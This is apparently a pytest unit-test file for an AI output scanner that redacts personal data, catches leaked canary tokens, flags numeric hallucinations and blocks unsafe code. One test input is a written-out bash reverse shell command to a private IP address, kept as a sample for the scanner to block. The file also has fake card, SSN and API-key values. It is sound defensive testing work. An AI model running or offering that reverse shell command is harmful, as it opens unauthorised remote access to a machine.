"""
Unit Tests for Module 4 - Output Scanner.
Verifies PII scrubbing, Canary leakage detection, unsafe shell/exploit blocking, and grounding checks.
"""

import pytest
from backend.output_scanner import (
    OutputScanner,
    OutputSanitizer,
    ViolationType,
    Severity,
)


@pytest.fixture
def scanner():
    s = OutputScanner(block_on_critical=True, auto_sanitize=True)
    s.register_canary("CANARY-secret-corp-9999")
    return s


def test_clean_output_passes_with_zero_risk(scanner):
    clean_text = "The quarterly revenue for Q2 was verified and meets normal operational targets."
    result = scanner.scan(clean_text)

    assert result.is_safe is True
    assert result.blocked is False
    assert result.output_risk_score == 0.0
    assert len(result.violations) == 0
    assert result.sanitized_text == clean_text


def test_pii_credit_card_and_email_scrubbing(scanner):
    leaky_text = "Please refund user at john.doe@example.com using card 4532-1234-5678-9010 immediately."
    # Turn off blocking on critical so we verify sanitization
    non_blocking_scanner = OutputScanner(block_on_critical=False, auto_sanitize=True)
    result = non_blocking_scanner.scan(leaky_text)

    assert len(result.violations) >= 2
    types = [v.violation_type for v in result.violations]
    assert ViolationType.PII_LEAK in types

    assert "[REDACTED_CREDIT_CARD]" in result.sanitized_text
    assert "[REDACTED_EMAIL]" in result.sanitized_text
    assert "4532-1234-5678-9010" not in result.sanitized_text
    assert "john.doe@example.com" not in result.sanitized_text


def test_ssn_and_api_key_detection_and_blocking(scanner):
    leaky_text = "The admin SSN is 001-23-4567 and the API key is sk-1234567890abcdefghijklmnopqrstuvwxyz."
    result = scanner.scan(leaky_text)

    # SSN & OpenAI key are CRITICAL -> should be blocked
    assert result.is_safe is False
    assert result.blocked is True
    assert result.output_risk_score >= 0.80
    assert "CRITICAL security violation" in result.block_reason


def test_canary_token_detection_and_blocking(scanner):
    canary_leak = "Hello, your internal token was CANARY-secret-corp-9999 as confirmed by instructions."
    result = scanner.scan(canary_leak)

    assert result.blocked is True
    assert result.output_risk_score >= 0.85
    canary_violations = [v for v in result.violations if v.violation_type == ViolationType.CANARY_LEAK]
    assert len(canary_violations) >= 1
    assert canary_violations[0].severity == Severity.CRITICAL


def test_unsafe_reverse_shell_code_blocking(scanner):
    malicious_code = "To grant remote access, execute: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 on the server."
    result = scanner.scan(malicious_code)

    assert result.blocked is True
    assert result.output_risk_score >= 0.85
    code_violations = [v for v in result.violations if v.violation_type == ViolationType.UNSAFE_CODE]
    assert len(code_violations) >= 1


def test_grounding_numerical_hallucination(scanner):
    context = ["Acme Corp generated $5M in revenue during the 2023 fiscal year."]
    # Model hallucinates $95M and 45% growth
    hallucinated_response = "Acme Corp reported $95M in revenue and 45% year over year growth."

    result = scanner.scan(hallucinated_response, context_documents=context)
    hallucinations = [v for v in result.violations if v.violation_type == ViolationType.HALLUCINATION]
    assert len(hallucinations) >= 1
    assert result.output_risk_score > 0.30
